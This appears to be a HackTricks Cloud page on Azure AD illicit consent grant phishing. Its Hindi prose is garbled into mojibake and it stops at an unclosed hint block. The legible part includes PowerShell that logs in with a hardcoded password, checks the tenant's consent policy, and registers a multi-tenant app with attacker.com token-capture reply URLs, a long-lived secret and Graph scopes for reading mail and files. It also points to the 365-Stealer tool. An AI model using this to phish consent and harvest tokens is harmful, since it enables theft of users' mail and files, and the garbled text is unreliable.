# Az - рдЕрдиреИрддрд┐рдХ рд╕рд╣рдорддрд┐ рдЕрдиреБрджрд╛рди

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos** рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## OAuth рдРрдк рдлрд┐рд╢рд┐рдВрдЧ

**Azure рдРрдкреНрд▓рд┐рдХреЗрд╢рди** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ (рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА, рд▓реЗрдХрд┐рди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ, рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдЖрджрд┐) рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдорд╛рдВрдЧрддреЗ рд╣реИрдВред\
рдпрджрд┐ **рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИ**, рддреЛ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ **"рдХрдо рдкреНрд░рднрд╛рд╡" рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред **рдЕрдиреНрдп рд╕рднреА** рдорд╛рдорд▓реЛрдВ рдореЗрдВ, **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рд╣рдорддрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреА рд╣реИ**ред\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` рдФрд░ `рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐` рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдПрдХ рдЕрдиреБрдХреВрд▓ рднреВрдорд┐рдХрд╛ рдЯреЗрдиреЗрдВрдЯ-рд╡реНрдпрд╛рдкреА рд╕рд╣рдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИрдВред

рдХреЗрд╡рд▓ рд╡реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдЬреЛ **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рд╣рдорддрд┐ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВ**, рдХреЛ **рдХрдо рдкреНрд░рднрд╛рд╡** рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд░реНрдЧреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИрдВред рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдореВрд▓ рд╕рд╛рдЗрди-рдЗрди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреА рд╣реИрдВ рдЬреИрд╕реЗ openid, profile, email, User.Read рдФрд░ offline\_accessред рдпрджрд┐ **рд╕рдВрдЧрдарди** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╣рдорддрд┐ рдХреЛ **рд╕рднреА рдРрдкреНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**, рддреЛ рдХрд░реНрдордЪрд╛рд░реА рдЕрдкрдиреА рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдКрдкрд░ рджрд┐рдП рдЧрдП рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИрдВ**ред

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рдХреБрдЯрд┐рд▓ рдРрдк** рддреИрдпрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИрдВ рдФрд░ рдлрд┐рд╢рд┐рдВрдЧ рдХреЗ рд╕рд╛рде, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдРрдк рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдФрд░ рдЙрд╕рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИрдВ**ред

### рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд╣рдорддрд┐ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдПрдВ рдРрдкреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИрдВ:

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╣рдорддрд┐ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ** : рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИред
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдкреНрд░рдХрд╛рд╢рдХ рдпрд╛ рдЖрдкрдХреЗ рд╕рдВрдЧрдарди рд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЪрдпрдирд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП** : рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдкреНрд░рдХрд╛рд╢рдХ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рдЯреЗрдиреЗрдВрдЯ рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╣реИрдВред
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рднреА рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рд╕реНрд╡реАрдХреГрддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ** : рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ,
* **рдХрд╕реНрдЯрдо рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╕рд╣рдорддрд┐ рдиреАрддрд┐**

## **рдЕрд╡реИрдз рд╕рд╣рдорддрд┐ рдЕрдиреБрдорддрд┐ рд╣рдорд▓рд╛ рдХреНрдпрд╛ рд╣реИ?**

рдЕрд╡реИрдз рд╕рд╣рдорддрд┐ рдЕрдиреБрдорддрд┐ рд╣рдорд▓реЗ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рдПрдЬрд╝реНрдпреВрд░-рдкрдВрдЬреАрдХреГрдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рд╕рдВрдкрд░реНрдХ рдЬрд╛рдирдХрд╛рд░реА, рдИрдореЗрд▓ рдпрд╛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЬреИрд╕реЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ**ред рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЕрдВрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╕рд╣рдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗ рдЬрд┐рд╕рдХреА рдкрд╣реБрдВрдЪ рдЙрджреНрджреЗрд╢реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣реИред рдЬрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╕рд╣рдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдЙрд╕реЗ рд╕рдВрдЧрдардирд╛рддреНрдордХ рдЦрд╛рддреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЗ рд╕реНрддрд░ рдкрд░ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИред

рд╕рд░рд▓ рд╢рдмреНрджреЛрдВ рдореЗрдВ рдХрд╣реЗрдВ рддреЛ рдЬрдм рдкреАрдбрд╝рд┐рдд рдЙрд╕ рд╕реБрдВрджрд░ рдиреАрд▓реЗ рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ "рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ", рддреЛ рдПрдЬрд╝реНрдпреВрд░ рдПрдбреА рддреАрд╕рд░реЗ рдкрдХреНрд╖ рд╕рд╛рдЗрдЯ рдХреЛ рдЯреЛрдХрди рднреЗрдЬрддрд╛ рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рд╣реЛрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рдирд╛рдо рдкрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдлрд╝рд╛рдЗрд▓реЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░рдирд╛, рдореЗрд▓ рдкрдврд╝рдирд╛, рдореЗрд▓ рднреЗрдЬрдирд╛ рдЖрджрд┐ред

## **рд╣рдорд▓рд╛ рдлреНрд▓реЛ**

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрдВрдкрдиреА "рдИрдХреЙрд░реНрдк" рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдиреЗ "рд╕реЗрдлрдбреЛрдореЗрдирд▓реЙрдЧрд┐рди.рдХреЙрдо" рдирд╛рдордХ рдбреЛрдореЗрди рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдФрд░ рдПрдХ рд╕рдмрдбреЛрдореЗрди ["рдИрдХреЙрд░реНрдк.рд╕реЗрдлрдбреЛрдореЗрдирд▓реЙрдЧрд┐рди.рдХреЙрдо"](http://ecorp.safedomainlogin.com/) рдмрдирд╛рдпрд╛ рдЬрд╣рд╛рдВ рд╡реЗ **рдЕрдзрд┐рдХреГрддреА рдХреЛ рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╣реЛрд╕реНрдЯ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рдлрд┐рд░ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВред

рдлрд┐рд░, рдЕрдкрдиреЗ рдПрдЬрд╝реНрдпреВрд░ рдПрдбреА рдЯреЗрдиреЗрдВрдЯ рдореЗрдВ рдПрдХ рдорд▓реНрдЯреА рдЯреЗрдиреЗрдВрдЯ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдкрдВрдЬреАрдХреГрдд рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ "рдИрдХреЙрд░реНрдк" рдирд╛рдордХ рд░рдЦреЗрдВ рдФрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдпреВрдЖрд░рдПрд▓ рдХреЛ "рдИрдХреЙрд░реНрдк.рд╕реЗрдлрдбреЛрдореЗрдирд▓реЙрдЧрд┐рди.рдХреЙрдо" рдХреА рдУрд░ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓рд╛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдпреВрдЖрд░рдПрд▓ рдЬреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рдкрдХрдбрд╝рдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╣реЛрд╕реНрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЕрдзрд┐рдХреГрддреА рдХреЛ рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рдХрд░рддрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдПрдХ рдирдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реАрдХреНрд░реЗрдЯ рдмрдирд╛рдпрд╛ рдФрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read` рдЬреИрд╕реА рдХреБрдЫ API **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдЬреЛрдбрд╝реАрдВред рддрд╛рдХрд┐ рдЬрдм **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЛ рд╕рд╣рдорддрд┐ рджреЗрддрд╛ рд╣реИ**, рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдкрд░ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдХреЛ **рдирд┐рдХрд╛рд▓** рд╕рдХреЗред

рд╣рдорд▓рд╛рд╡рд░ рдЕрдВрдд рдореЗрдВ рдПрдХ **рд▓рд┐рдВрдХ** рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЦрд╝рд░рд╛рдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдбреА рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ **рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреЗ рд╕рд╛рде **рд╕рд╛рдЭрд╛** рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЙрдирдХреА рд╕рд╣рдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗред

## 365-Stealer

рдЖрдк [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) рдХреЗ рд╕рд╛рде рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрддрд┐рд░рд┐рдХреНрдд рдХрджрдо рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рд╕рдВрдЧрдарди рдореЗрдВ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░ рдХреБрдЫ **рдкрд╣реБрдВрдЪ рд╣реИ**, рддреЛ рдЖрдк рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдиреАрддрд┐ рдЙрд╕реЗ **рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧреА** рдпрд╛ рдирд╣реАрдВ:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЕрдкрдиреЗ Azure Tenant рдореЗрдВ рдПрдХ **рдирдпрд╛ рдРрдк рдмрдирд╛рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (App registrations рдореЗрдВ) рдЬрд┐рд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` `Microsoft Graph` рдореЗрдВ `Delegated permissions` рдореЗрдВ рд╣реИред (рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╣рдореЗрд╢рд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рдордВрдЬреВрд░реА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

* `User.ReadBasic.All` рдЕрдиреБрдорддрд┐ рдЖрдкрдХреЛ рд╕рдВрдЧрдарди рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧреА рдЕрдЧрд░ рдордВрдЬреВрд░реА рдорд┐рд▓ рдЬрд╛рдПред
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЗрд╡рд▓ `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` рдФрд░ `рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐` рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдПрдХ рдХрд╕реНрдЯрдо рднреВрдорд┐рдХрд╛ рдЯреЗрдиреЗрдВрдЯ-рд╡реНрдпрд╛рдкреА рд╕рд╣рдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдк рдПрдХ рдРрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдлрд┐рд╢рд┐рдВрдЧ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдЙрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреВрдорд┐рдХрд╛ рд╣реЛ** рдЬрд┐рд╕реЗ рдПрдХ **рдРрдк рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рд╣рдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ**ред

рдЖрдк CLI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА рдПрдХ рдРрдк рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

рдЗрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреГрдкрдпрд╛ [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) рджреЗрдЦреЗрдВред

{% hint style="warning" %}
